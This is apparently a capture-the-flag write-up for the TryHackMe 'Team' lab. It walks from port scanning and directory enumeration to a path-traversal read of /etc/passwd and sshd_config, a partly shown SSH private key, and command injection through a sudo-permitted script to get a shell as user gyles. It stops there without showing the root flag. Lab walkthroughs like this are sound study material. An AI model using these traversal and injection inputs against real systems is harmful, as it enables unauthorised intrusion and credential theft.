# [THM] - Team

[Room link](https://tryhackme.com/room/teamcw)

---

## Enumeration

Nmap :

```bash
$ sudo nmap -sS -oN 
[...]
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Ftp as anonymous is disable

```bash
220 (vsFTPd 3.0.3)
Name (10.10.107.140:x): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

Let's check the website.

Scan with dirb :

```bash
$ dirb http://<target_ip>
```

Nothing.

We cas see the title of default page on this website : Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!

We add this line in /etc/hosts :

```bash
<target_ip> team.thm
```

Now we can see an another virtualhost on http://team.thm/

Let's restart a simple dirb scan :

```bash
$ dirb http://team.thm/
```

robots.txt contains this string : "dale"

Let's run gobuster in /scripts/ directory. 

There is a script.txt with an interesting lines :

```txt
# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

If we try script.old, we can download file. In this file, we have the ftp credentials.

```bash
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -l
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 .
drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 ..
-rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
226 Directory send OK.
ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
100% |******************************************|   269      118.22 KiB/s    00:00 ETA
226 Transfer complete.
269 bytes received in 00:00 (8.00 KiB/s)
```

This file contains this :

```txt
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.
```

Let's add this line on this file /etc/hosts :

```bash
dev.team.thm <target_ip>
```

We found a new file script.php on the main page of this website.

We can play with the parameter for display something else like /etc/passwd :

```bash
curl http://dev.team.thm/script.php?page=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```

There is some interesting user like dale and gyles.

After some research, we can get the private key of dale :

```bash
http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config
[...]
Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
[...]
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```` 

We can use it to connect us on the target machine.

```bash
$ ssh -i id_rsa_dale dale@dev.team.thm                                         
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ 
```

---

## Flag user

User flag is here -> /home/dale/user.txt

---

## Flag root

For getting a root shell let's check the sudo's permissions. 

```bash
$ sudo -l
[...]
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

let's execute this script

```bash
$ sudo -u gyles /home/gyles/admin_checks
[...]
Reading stats.
Reading stats..
Enter name of person backing up the data: id
Enter 'date' to timestamp the file: id
The Date is uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
Stats have been backed up
```

We can inject commands through the script as gyles.

```bash
Enter 'date' to timestamp the file: /bin/bash
The Date is 
ls
admin_checks
whoami
gyles
```


